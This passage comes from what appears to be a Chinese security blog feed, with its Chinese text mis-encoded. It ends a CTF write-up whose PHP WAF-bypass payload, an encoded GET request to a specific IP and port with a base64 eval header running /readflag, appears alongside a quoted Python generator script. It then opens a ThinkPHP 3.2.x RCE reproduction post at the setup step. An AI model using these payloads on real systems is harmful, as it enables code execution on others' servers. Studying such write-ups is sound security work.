class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">3</span>))&#123;<span class="number">1</span>&#125;)); <span class="comment">// s</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€åéœ€è¦è¿‡<code>/readflag</code>çš„éªŒè¯ç , å¯ä»¥ä½¿ç”¨ä½¿ç”¨<code>Perl</code>, ä¹Ÿå¯ä»¥é€šè¿‡ <code>php -r &quot;&quot;</code>çš„æ–¹å¼æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">"eval(base64_decode('JHByb2Nlc3MgPSBwcm9jX29wZW4oDQogJy9yZWFkZmxhZycsDQogW1sicGlwZSIsICJyIl0sWyJwaXBlIiwgInciXSxbInBpcGUiLCAidyJdXSwkcGlwZXMNCik7DQpmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KJGV4cCA9IGZyZWFkKCRwaXBlc1sxXSwgMTAyNCk7DQokZXhwID0gZXhwbG9kZSgiXG4iLCAkZXhwKVswXTsNCmZ3cml0ZSgkcGlwZXNbMF0sIGV2YWwoInJldHVybiAkZXhwOyIpLiJcbiIpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0K'));"</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆçš„payload</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">GET /calc.php?<span class="built_in">num</span>=(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">3</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">9</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">3</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((-<span class="number">1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B0</span>%7D)))(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">6</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">6</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))))((((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">8</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)))).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">2</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">3</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)))()))%3B HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.156</span><span class="number">.140</span><span class="number">.90</span>:<span class="number">8081</span></span><br><span class="line">z: php -r <span class="string">"eval(base64_decode('JHByb2Nlc3MgPSBwcm9jX29wZW4oDQogJy9yZWFkZmxhZycsDQogW1sicGlwZSIsICJyIl0sWyJwaXBlIiwgInciXSxbInBpcGUiLCAidyJdXSwkcGlwZXMNCik7DQpmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KJGV4cCA9IGZyZWFkKCRwaXBlc1sxXSwgMTAyNCk7DQokZXhwID0gZXhwbG9kZSgiXG4iLCAkZXhwKVswXTsNCmZ3cml0ZSgkcGlwZXNbMF0sIGV2YWwoInJldHVybiAkZXhwOyIpLiJcbiIpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0K'));"</span></span><br></pre></td></tr></table></figure>

<p>åé¢åˆçœ‹åˆ°äº†<a href="https://www.mrkaixin.top/posts/fbd7e4e1/#1-0-bypass-waf" target="_blank" rel="noopener">å¼€å¿ƒå¸ˆå‚…çš„è„šæœ¬</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">""" Python</span></span><br><span class="line"><span class="string">Author: Mrkaixin</span></span><br><span class="line"><span class="string">Date: 2020-05-30 21:32</span></span><br><span class="line"><span class="string">FileName: exp.py</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">word_dict = &#123;</span><br><span class="line">    <span class="string">"0"</span>: <span class="string">"((0).(0))"</span>,</span><br><span class="line">    <span class="string">"1"</span>: <span class="string">"((1).(0))"</span>,</span><br><span class="line">    <span class="string">"2"</span>: <span class="string">"((2).(0))"</span>,</span><br><span class="line">    <span class="string">"3"</span>: <span class="string">"((3).(0))"</span>,</span><br><span class="line">    <span class="string">"4"</span>: <span class="string">"((4).(0))"</span>,</span><br><span class="line">    <span class="string">"5"</span>: <span class="string">"((5).(0))"</span>,</span><br><span class="line">    <span class="string">"6"</span>: <span class="string">"((6).(0))"</span>,</span><br><span class="line">    <span class="string">"7"</span>: <span class="string">"((7).(0))"</span>,</span><br><span class="line">    <span class="string">"8"</span>: <span class="string">"((8).(0))"</span>,</span><br><span class="line">    <span class="string">"9"</span>: <span class="string">"((9).(0))"</span>,</span><br><span class="line">    <span class="string">"="</span>: <span class="string">"(((1).(0)))|(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"+"</span>: <span class="string">"((99999999999999999999).(1))&#123;4&#125;"</span>,</span><br><span class="line">    <span class="string">"."</span>: <span class="string">"((99999999999999999999).(1))&#123;1&#125;"</span>,</span><br><span class="line">    <span class="string">"&lt;"</span>: <span class="string">"(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"$"</span>: <span class="string">"(((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;"</span>,</span><br><span class="line">    <span class="string">"@"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"~"</span>: <span class="string">"(((0).(0)))|(((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">"&#123;"</span>: <span class="string">"(((0).(0)))|(((99999999999999999999).(1))&#123;4&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"&#125;"</span>: <span class="string">"(((0).(0)))|((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">","</span>: <span class="string">"(((99999999999999999999).(1))&#123;1&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"("</span>: <span class="string">"(((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">")"</span>: <span class="string">"(((9).(0)))%26((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;"</span>,</span><br><span class="line">    <span class="string">"d"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"e"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"f"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((4).(1))"</span>,</span><br><span class="line">    <span class="string">"h"</span>: <span class="string">"((((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"i"</span>: <span class="string">"((((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"j"</span>: <span class="string">"((((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((4).(1))"</span>,</span><br><span class="line">    <span class="string">"k"</span>: <span class="string">"(((99999999999999999999).(1))&#123;4&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"l"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((5).(3))"</span>,</span><br><span class="line">    <span class="string">"m"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">"n"</span>: <span class="string">"(((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"o"</span>: <span class="string">"(((99999999999999999999).(1))&#123;4&#125;)|(((2).(1/!1))&#123;2&#125;)%26~((3).(3))"</span>,</span><br><span class="line">    <span class="string">"p"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((0).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"q"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((1).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"r"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((2).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"s"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((3).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"t"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((4).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"u"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((5).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"v"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((6).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"w"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((7).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"x"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((8).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"y"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((9).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"z"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((8).(0))&#123;0&#125;|((2).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"E"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((2).(1/!1))&#123;2&#125;)%26~((2).(1))%26~((9).(1))"</span>,</span><br><span class="line">    <span class="string">"G"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((1).(1/!1))&#123;2&#125;)%26~((%39).(1))"</span>,</span><br><span class="line">    <span class="string">"K"</span>: <span class="string">"((((1).(1/!1))&#123;3&#125;)%26~((4).(1)))|(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">"M"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((2).(1/!1))&#123;2&#125;)%26~((3).(3))"</span>,</span><br><span class="line">    <span class="string">"O"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((1).(1/!1))&#123;2&#125;)%26~((%30).(1))"</span>,</span><br><span class="line">    <span class="string">"B"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((4).(1))"</span>,</span><br><span class="line">    <span class="string">"C"</span>: <span class="string">"((((1).(1/!1))&#123;3&#125;)%26~((4).(1)))|(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"A"</span>: <span class="string">"(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"I"</span>: <span class="string">"(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">"H"</span>: <span class="string">"(((2).(1/!1))&#123;1&#125;)%26~((5).(3))"</span>,</span><br><span class="line">    <span class="string">"L"</span>: <span class="string">"(((2).(1/!1))&#123;2&#125;)%26~((3).(3))"</span>,</span><br><span class="line">    <span class="string">"D"</span>: <span class="string">"(((2).(1/!1))&#123;2&#125;)%26~((2).(1))%26~((9).(1))"</span>,</span><br><span class="line">    <span class="string">"N"</span>: <span class="string">"(((1).(1/!1))&#123;2&#125;)%26~((%30).(1))"</span>,</span><br><span class="line">    <span class="string">"J"</span>: <span class="string">"(((1).(1/!1))&#123;2&#125;)%26~((%34).(1))"</span>,</span><br><span class="line">    <span class="string">"F"</span>: <span class="string">"(((1).(1/!1))&#123;2&#125;)%26~((%39).(1))"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">got = [i <span class="keyword">for</span> i <span class="keyword">in</span> word_dict.keys()]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œå†™ä¸Šæƒ³è¦çš„ï¼Œé…åˆé«˜å¸ˆå‚…çš„è„šæœ¬ä¸€èµ·ç”¨æœ€å¥½</span></span><br><span class="line">iwant = string.ascii_letters + <span class="string">"_"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Or</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> need <span class="keyword">in</span> iwant:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> got:</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> got:</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">                d = chr(ord(i) | ord(j))</span><br><span class="line">                <span class="keyword">if</span> d == need:</span><br><span class="line">                    <span class="comment"># print(d,i,j)</span></span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    print(<span class="string">f"\"<span class="subst">&#123;d&#125;</span>\":\"(<span class="subst">&#123;word_dict[i]&#125;</span>)|<span class="subst">&#123;word_dict[j]&#125;</span>\","</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">And</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> need <span class="keyword">in</span> iwant:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> got:</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> got:</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">                d = chr(ord(i) &amp; ord(j))</span><br><span class="line">                <span class="keyword">if</span> d == need:</span><br><span class="line">                    <span class="comment"># print(d,i,j)</span></span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    print(<span class="string">f"\"<span class="subst">&#123;d&#125;</span>\":\"(<span class="subst">&#123;word_dict[i]&#125;</span>)%26<span class="subst">&#123;word_dict[j]&#125;</span>\","</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">product</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># exp</span></span><br><span class="line">    exp = <span class="string">""</span></span><br><span class="line">    <span class="comment"># exp = "var"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> exp:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> got:</span><br><span class="line">            print(<span class="string">f"(<span class="subst">&#123;word_dict[i]&#125;</span>)."</span>)</span><br><span class="line">        <span class="keyword">elif</span> i.upper() <span class="keyword">in</span> got:</span><br><span class="line">            print(<span class="string">f"(<span class="subst">&#123;word_dict[i.upper()]&#125;</span>)."</span>)</span><br><span class="line">            <span class="comment"># print(i.upper() + word_dict[i.upper()])</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(i + <span class="string">"lost"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    And()</span><br><span class="line">    <span class="comment"># Or()</span></span><br><span class="line">    <span class="comment"># product()</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>tag1</tag>
        <tag>tag2</tag>
        <tag>tag3</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP3.2.x RCEå¤ç°</title>
    <url>/2021/07/ThinkPHP3-2-x-RCE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ThinkPHP3-2-x-RCEå¤ç°"><a href="#ThinkPHP3-2-x-RCEå¤ç°" class="headerlink" title="ThinkPHP3.2.x RCEå¤ç°"></a>ThinkPHP3.2.x RCEå¤ç°</h1><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p>è¯¥æ¼æ´æ˜¯åœ¨å—å½±å“çš„ç‰ˆæœ¬ä¸­ï¼Œä¸šåŠ¡ä»£ç ä¸­å¦‚æœæ¨¡æ¿èµ‹å€¼æ–¹æ³•assignçš„ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œåˆ™å¯å¯¼è‡´æ¨¡æ¿æ–‡ä»¶è·¯å¾„å˜é‡è¢«è¦†ç›–ä¸ºæºå¸¦æ”»å‡»ä»£ç çš„æ–‡ä»¶è·¯å¾„ï¼Œé€ æˆä»»æ„æ–‡ä»¶åŒ…å«ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚ä¸ªäººæ„Ÿè§‰è¿™ä¸ªæ¼æ´è™½ç„¶ä¸å¦‚thinkphpæœ¬ä½“çš„ä¸€äº›RCEæ¼æ´å½±å“èŒƒå›´å¤§ï¼Œä½†ä¹Ÿç®—æ˜¯æä¾›äº†ä¸€ä¸ªæ€è·¯ï¼Œå¯¹åŸºäºæŸäº›æ¡†æ¶äºŒæ¬¡å¼€å‘çš„ç³»ç»Ÿï¼Œå¯»æ‰¾å…¶ä¸è§„èŒƒçš„æ–¹æ³•è°ƒç”¨çš„æ€è·¯è¿˜æ˜¯å€¼å¾—å­¦ä¹ çš„ã€‚</p><a id="more"></a>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><a href="https://codeload.github.com/top-think/thinkphp/zip/refs/tags/3.2.3" target="_blank" rel="noopener">ThinkPHP3.2.3</a> Phpstudy8.1.1 PHP-5.6.9 Apache Windows10(<a href="https://www.kancloud.cn/manual/thinkphp/1678" target="_blank" rel="noopener">tp3æ‰‹å†Œ</a>)</p>
<p>å¦‚æœæ˜¯linuxå¯ä»¥ç”¨composeræ‹‰å–ç¯å¢ƒ( composer create-project topthink/thinkphp=3.2.3 tp3)</p>
<p>å…ˆè®¿é—®<a href="http://xxx.xx/index.php" target="_blank" rel="noopener">http://xxx.xx/index.php</a> ç”Ÿæˆé¡¹ç›®æ–‡ä»¶</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCEå¤ç°/image-20210714130932384.png" alt="image-20210714130932384"></p>
<p>ç„¶ååœ¨<code>\Application\Home\Controller\IndexController.class.php</code>å†™å…¥demoä»£ç </p>
